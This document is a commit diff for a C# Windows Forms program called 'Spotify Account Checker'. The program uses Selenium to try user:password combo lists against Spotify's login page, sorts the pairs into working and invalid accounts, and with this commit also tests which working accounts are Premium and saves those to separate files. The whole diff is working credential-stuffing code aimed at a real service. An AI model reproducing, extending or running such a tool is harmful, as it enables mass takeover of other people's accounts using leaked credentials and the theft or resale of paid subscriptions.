1e52ca66de5847d0c909a04abc3ec406e792d3e1
Unknown <cmesina@parrastu.catholic.edu.au>
2017-01-28 12:53:58 +1100

    Added premium check

--- Spotify Account Checker/Form1.Designer.cs
+++ Spotify Account Checker/Form1.Designer.cs
@@ -46,6 +46,12 @@
             this.label2 = new System.Windows.Forms.Label();
             this.label1 = new System.Windows.Forms.Label();
             this.progressBar1 = new System.Windows.Forms.ProgressBar();
+            this.checkBox1 = new System.Windows.Forms.CheckBox();
+            this.listView1 = new System.Windows.Forms.ListView();
+            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
+            this.button3 = new System.Windows.Forms.Button();
+            this.button6 = new System.Windows.Forms.Button();
             this.groupBox1.SuspendLayout();
             this.groupBox2.SuspendLayout();
             this.groupBox3.SuspendLayout();
@@ -228,11 +234,68 @@
             this.progressBar1.Size = new System.Drawing.Size(458, 42);
             this.progressBar1.TabIndex = 0;
             // 
+            // checkBox1
+            // 
+            this.checkBox1.AutoSize = true;
+            this.checkBox1.Location = new System.Drawing.Point(761, 372);
+            this.checkBox1.Name = "checkBox1";
+            this.checkBox1.Size = new System.Drawing.Size(274, 29);
+            this.checkBox1.TabIndex = 8;
+            this.checkBox1.Text = "Check Premium Status?";
+            this.checkBox1.UseVisualStyleBackColor = true;
+            this.checkBox1.CheckedChanged += new System.EventHandler(this.checkBox1_CheckedChanged);
+            // 
+            // listView1
+            // 
+            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
+            this.columnHeader1,
+            this.columnHeader2});
+            this.listView1.Location = new System.Drawing.Point(669, 421);
+            this.listView1.Name = "listView1";
+            this.listView1.Size = new System.Drawing.Size(453, 428);
+            this.listView1.TabIndex = 9;
+            this.listView1.UseCompatibleStateImageBehavior = false;
+            this.listView1.View = System.Windows.Forms.View.Details;
+            // 
+            // columnHeader1
+            // 
+            this.columnHeader1.Text = "Account";
+            this.columnHeader1.Width = 154;
+            // 
+            // columnHeader2
+            // 
+            this.columnHeader2.Text = "Status";
+            this.columnHeader2.Width = 244;
+            // 
+            // button3
+            // 
+            this.button3.Location = new System.Drawing.Point(669, 855);
+            this.button3.Name = "button3";
+            this.button3.Size = new System.Drawing.Size(227, 55);
+            this.button3.TabIndex = 10;
+            this.button3.Text = "Save Premium";
+            this.button3.UseVisualStyleBackColor = true;
+            this.button3.Click += new System.EventHandler(this.button3_Click);
+            // 
+            // button6
+            // 
+            this.button6.Location = new System.Drawing.Point(902, 855);
+            this.button6.Name = "button6";
+            this.button6.Size = new System.Drawing.Size(220, 55);
+            this.button6.TabIndex = 11;
+            this.button6.Text = "Save Free";
+            this.button6.UseVisualStyleBackColor = true;
+            this.button6.Click += new System.EventHandler(this.button6_Click);
+            // 
             // Form1
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(12F, 25F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.ClientSize = new System.Drawing.Size(1140, 933);
+            this.Controls.Add(this.button6);
+            this.Controls.Add(this.button3);
+            this.Controls.Add(this.listView1);
+            this.Controls.Add(this.checkBox1);
             this.Controls.Add(this.groupBox4);
             this.Controls.Add(this.groupBox3);
             this.Controls.Add(this.groupBox2);
@@ -250,6 +313,7 @@
             this.groupBox4.ResumeLayout(false);
             this.groupBox4.PerformLayout();
             this.ResumeLayout(false);
+            this.PerformLayout();
 
         }
 
@@ -273,6 +337,12 @@
         private System.Windows.Forms.ListBox listBox3;
         private System.Windows.Forms.Label label6;
         private System.Windows.Forms.Label label5;
+        private System.Windows.Forms.CheckBox checkBox1;
+        private System.Windows.Forms.ListView listView1;
+        private System.Windows.Forms.ColumnHeader columnHeader1;
+        private System.Windows.Forms.ColumnHeader columnHeader2;
+        private System.Windows.Forms.Button button3;
+        private System.Windows.Forms.Button button6;
     }
 }
 
--- Spotify Account Checker/Form1.cs
+++ Spotify Account Checker/Form1.cs
@@ -20,8 +20,7 @@ namespace Spotify_Account_Checker
     public partial class Form1 : Form
     {
         //selenium webdriver
-        
-        ChromeOptions options = new ChromeOptions();
+      
         IWebDriver driver = new ChromeDriver();
       
         public Form1()
@@ -53,6 +52,8 @@ namespace Spotify_Account_Checker
                     }
 
                 }
+
+                //change label text to reflect maximum combo items.
                 int i = listBox1.Items.Count;
                 int progress = 0;
                 label2.Text = "0" + "/" + i;
@@ -68,26 +69,41 @@ namespace Spotify_Account_Checker
 
         public async Task login(string user, string password)
         {
-            //navigate to spotify login page
+            
             Console.WriteLine("Loading Spotify Login Page");
+            //clear cookies aka logout
             driver.Manage().Cookies.DeleteAllCookies();
+            //navigate to spotify login page
             driver.Navigate().GoToUrl("https://accounts.spotify.com/en/login");
             Console.WriteLine("Waiting for page load...");
+            //wait for page to load.
             driver.Manage().Timeouts().ImplicitlyWait(TimeSpan.FromSeconds(30));
             Console.WriteLine("Page successfully loaded!");
             Console.WriteLine("Begin check");
+            //write to console currently checked.
             Console.WriteLine("Sending " + user + " to browser");
+            //selenium - find username textbox.
             driver.FindElement(By.Id("login-username")).Clear();
+            //send keys to username textbox
             driver.FindElement(By.Id("login-username")).SendKeys(user);
+            //wait 200 miliseconds.
             Thread.Sleep(200);
+            //write to console currently checked.
             Console.WriteLine("Sending " + password + " to browser");
+            //selenium find password box.
             driver.FindElement(By.Id("login-password")).Clear();
+            //send password to textbox.
             driver.FindElement(By.Id("login-password")).SendKeys(password);
+            //wait 200 miliseconds
             Thread.Sleep(200);
+            //submit login.
             Console.WriteLine("Submitting Login...");
+            //send enter key.
             driver.FindElement(By.Id("login-password")).SendKeys(OpenQA.Selenium.Keys.Enter);
+            //wait 1 second.
             Thread.Sleep(1000);
             Console.WriteLine("Waiting for page load...");
+            //wait for page load.
             driver.Manage().Timeouts().ImplicitlyWait(TimeSpan.FromSeconds(30));
             Console.WriteLine("Page loaded, checking if successfull");
             
@@ -97,17 +113,22 @@ namespace Spotify_Account_Checker
 
        
         public async Task<bool?> check_()
+            //check login function
         {
-           
+
+                      
                 IWebElement body = driver.FindElement(By.TagName("body"));
+                //if page login incorrect, return false.
                 if (body.Text.Contains("Incorrect"))
                 {
                     return false;
                 }
+                //if successfull return true.
                 else if (body.Text.Contains("logged"))
                 {
                     return true;
                 }
+                //if unknown return null
                 else
                 {
                     return null;
@@ -117,33 +138,67 @@ namespace Spotify_Account_Checker
            
         }
 
+        //check premium status
+        public async Task<bool?> isPremium()
+        {
+            driver.Navigate().GoToUrl("https://accounts.spotify.com/en-US/login?continue=https:%2F%2Fwww.spotify.com%2Fau%2Faccount%2Foverview%2F");
+            driver.Manage().Timeouts().ImplicitlyWait(TimeSpan.FromSeconds(30));
+            IWebElement product = driver.FindElement(By.ClassName("product-name"));
+            if (product.Text.Contains("Free"))
+            {
+                return false;
+            }
+            else if (product.Text.Contains("Premium"))
+            {
+                return true;
+            }
+            else
+            {
+                return null;
+            }
+
+        }
+
     
 
 
         private async void button2_Click(object sender, EventArgs e)
         {
+            button2.Enabled = false;
+            checkBox1.Enabled = false;
+            //set progressbar maximum.
             int i = listBox1.Items.Count;
             int progress = 0;
             label2.Text = "0" + "/" + i;
             progressBar1.Maximum = i;
             int retries = 0;
+            //iterate over each combo in listbox1
             foreach (string item in listBox1.Items)
             {
             code_start:
+              
+                //split combo by :
                 string[] user = item.Split(new String[] { ":" }, StringSplitOptions.None);
+                //username
                 label5.Text = user[0];
+                //password
                 label6.Text = user[1];
-                //check if proxies is enabled
+               
 
-
+                //run login task, passing username and password to function.
                 Task task = Task.Run(() => login(user[0], user[1]));
                 await task;
 
 
-
+                //run check task.
                 Task<bool?> check = Task<bool?>.Run(() => check_());
+                //set variable to the returned boolean of the check function.
                 bool? working = await check;
 
+                
+              
+
+                //if working add to working list.
                 if (working == true)
                 {
                     Console.ForegroundColor = ConsoleColor.Green;
@@ -151,13 +206,16 @@ namespace Spotify_Account_Checker
                     Console.ResetColor();
                     listBox2.Items.Add(item);
                 }
+                //if not working add to not working list.
                 else if (working == false)
                 {
                     Console.ForegroundColor = ConsoleColor.DarkYellow;
                     Console.WriteLine(user[0] + " " + user[1] + "is not working");
                     Console.ResetColor();
                     listBox3.Items.Add(item);
+
                 }
+                //if cannot determine retry 4 times.
                 else if (working == null)
                 {
 
@@ -178,7 +236,45 @@ namespace Spotify_Account_Checker
 
                 }
 
+                if (checkBox1.Checked == true && working == true)
+                {
+                    int retries_ = 0;
+                    check_start:
+                    Console.WriteLine("Checking premium status...");
+                    Task<bool?> check_Status = Task<bool?>.Run(() => isPremium());
+                    bool? premium = await check_Status;
+                    if (premium == true)
+                    {
+                        Console.WriteLine(item + " is a premium account");
+                        listView1.Items.Add(item).SubItems.Add("Premium");
 
+
+                    }
+                    else if (premium == false)
+                    {
+                        Console.WriteLine(item + " is a free account");
+                        listView1.Items.Add(item).SubItems.Add("Free");
+                    }
+                    else if (premium == null)
+                    {
+                        while (retries < 5)
+                        {
+                            Console.ForegroundColor = ConsoleColor.Red;
+                            Console.WriteLine("Cannot determine status. Rechecking. " + "(" + retries_ + ")");
+                            Console.ResetColor();
+                            retries_ = retries_ + 1;
+                            goto check_start;
+                        }
+                        Console.ForegroundColor = ConsoleColor.Red;
+                        Console.WriteLine("Maximum retries reached. Assumming account is not free.");
+                        Console.ResetColor();
+                        Console.WriteLine(item + " is a free account");
+                        listView1.Items.Add(item).SubItems.Add("Free");
+
+                    }
+                }
+
+                //set group box text and others.
                 progress = progress + 1;
                 progressBar1.Value = progress;
                 label2.Text = progress + "/" + i;
@@ -187,13 +283,18 @@ namespace Spotify_Account_Checker
 
             }
             
-
+            //completed check.
             MessageBox.Show("Check Completed. Have found " + listBox2.Items.Count + " working accounts and " + listBox3.Items.Count + " invalid accounts");
             progressBar1.Value = 0;
             label2.Text = "0" + "/" + i;
-            
+            button2.Enabled = true;
+            checkBox1.Enabled = true;
+
         }
 
+
+
+        //CONSOLE WINDOW
         public static void ShowConsoleWindow()
         {
             var handle = GetConsoleWindow();
@@ -227,20 +328,26 @@ namespace Spotify_Account_Checker
         const int SW_HIDE = 0;
         const int SW_SHOW = 5;
 
+        //END CONSOLE WINDOW
+
         private void Form1_Load(object sender, EventArgs e)
         {
+            //show console window
             ShowConsoleWindow();
+            //log loaded successfully
             Console.WriteLine("Application Successfully Loaded!");
             
         }
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
+            //quit driver
             driver.Quit();
         }
 
         private void button5_Click(object sender, EventArgs e)
         {
+            //save working accounts to text file.
             var saveFile = new SaveFileDialog();
             saveFile.Filter = "Text (*.txt)|*.txt";
             if (saveFile.ShowDialog() == System.Windows.Forms.DialogResult.OK)
@@ -254,13 +361,66 @@ namespace Spotify_Account_Checker
 
         private void button4_Click(object sender, EventArgs e)
         {
+            //clear listbox
             listBox1.Items.Clear();
         }
 
-       
+        private void checkBox1_CheckedChanged(object sender, EventArgs e)
+        {
 
-    
+        }
+
+        private void button3_Click(object sender, EventArgs e)
+        {
+
+            var saveFile = new SaveFileDialog();
+            saveFile.Filter = "Text (*.txt)|*.txt";
+            if (saveFile.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+            {
+                using (StreamWriter sw = new StreamWriter(saveFile.FileName, false))
+                {
+                    foreach (ListViewItem item in listView1.Items)
+                    {
+                        
+                        for (int i = 1; i < item.SubItems.Count; i++)
+                            if (item.SubItems[i].Text == "Premium")
+                            {
+                                sw.Write(item.Text);
+                                sw.Write(Environment.NewLine);
+
+                            }
+                            
+                        
+                    }
+                }
+            }
+        }
+
+        private void button6_Click(object sender, EventArgs e)
+        {
+            var saveFile = new SaveFileDialog();
+            saveFile.Filter = "Text (*.txt)|*.txt";
+            if (saveFile.ShowDialog() == System.Windows.Forms.DialogResult.OK)
+            {
+                using (StreamWriter sw = new StreamWriter(saveFile.FileName, false))
+                {
+                    foreach (ListViewItem item in listView1.Items)
+                    {
+                        
+                        for (int i = 1; i < item.SubItems.Count; i++)
+                            if (item.SubItems[i].Text == "Free")
+                            {
+                                sw.Write(item.Text);
+                                sw.Write(Environment.NewLine);
+                            }
+
+                        
+                    }
+                }
+            }
+        }
     }
-}
+    }
+
     
 
